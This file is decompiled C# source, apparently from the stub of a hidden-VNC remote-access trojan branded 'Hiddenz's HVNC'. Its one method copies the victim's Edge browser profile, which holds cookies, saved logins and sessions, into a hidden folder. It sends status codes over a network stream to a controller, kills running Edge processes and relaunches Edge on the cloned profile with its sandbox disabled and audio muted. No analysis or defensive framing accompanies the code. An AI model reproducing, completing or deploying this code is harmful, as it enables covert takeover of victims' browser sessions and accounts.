using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000056 RID: 86
	public class GClass8
	{
		// Token: 0x0600011D RID: 285
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr intptr_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

		// Token: 0x0600011E RID: 286 RVA: 0x00007708 File Offset: 0x00005908
		public static void smethod_0(bool bool_0, bool bool_1, bool bool_2, string String_0)
		{
			try
			{
				if (Conversions.ToBoolean(GClass0.smethod_3(new FileInfo(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Waluigi\\lockfile"))))
				{
					GClass0.smethod_2(GClass0.networkStream_0, "25|Edge has already been opened!");
				}
				else
				{
					if (bool_0)
					{
						GClass0.smethod_2(GClass0.networkStream_0, "22|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data") / 1024.0 / 1024.0)));
						GClass2 gclass = new GClass2();
						gclass.method_0(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Waluigi");
						try
						{
							GClass0.computer_0.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data", Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Waluigi", true);
						}
						catch (Exception ex)
						{
						}
						gclass.method_2();
						GClass0.smethod_2(GClass0.networkStream_0, "204|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\User Data") / 1024.0 / 1024.0)));
					}
					else
					{
						GClass0.smethod_2(GClass0.networkStream_0, "205|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\Google\\Chrome\\User Data") / 1024.0 / 1024.0)));
					}
					Process[] processesByName = Process.GetProcessesByName("msedge");
					for (int i = 0; i < processesByName.Length; i++)
					{
						GClass0.smethod_4(processesByName[i]);
					}
					if (bool_2)
					{
						if (bool_1)
						{
							Process.Start("msedge", string.Concat(new string[]
							{
								"--user-data-dir=\"",
								Interaction.Environ("localappdata"),
								"\\Microsoft\\Edge\\Waluigi\" \"",
								String_0,
								"\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio"
							})).WaitForInputIdle();
						}
						else
						{
							Process.Start("msedge", string.Concat(new string[]
							{
								"--user-data-dir=\"",
								Interaction.Environ("localappdata"),
								"\\Microsoft\\Edge\\Waluigi\" \"",
								String_0,
								"\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio"
							})).WaitForInputIdle();
						}
					}
					else if (bool_1)
					{
						Process.Start("msedge", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Waluigi\" \"data:text/html,<center><title>Welcome to Hiddenz's HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='black'>Welcome to Hiddenz's HVNC !</font></h1></center>\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					}
					else
					{
						Process.Start("msedge", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\Microsoft\\Edge\\Waluigi\" \"data:text/html,<center><title>Welcome to Hiddenz's HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='black'>Welcome to Hiddenz's HVNC !</font></h1></center>\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					}
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (GClass0.smethod_1("Welcome to Hiddenz's HVNC !") == (IntPtr)0)
					{
						Application.DoEvents();
						if (stopwatch.ElapsedMilliseconds >= 10000L)
						{
							return;
						}
					}
					stopwatch.Stop();
					processesByName = Process.GetProcessesByName("msedge");
					for (int j = 0; j < processesByName.Length; j++)
					{
						GClass0.smethod_5(processesByName[j]);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x040000DC RID: 220
		public const short short_0 = 2;

		// Token: 0x040000DD RID: 221
		public const short short_1 = 1;

		// Token: 0x040000DE RID: 222
		public const short short_2 = 4;

		// Token: 0x040000DF RID: 223
		public const int int_0 = 64;
	}
}
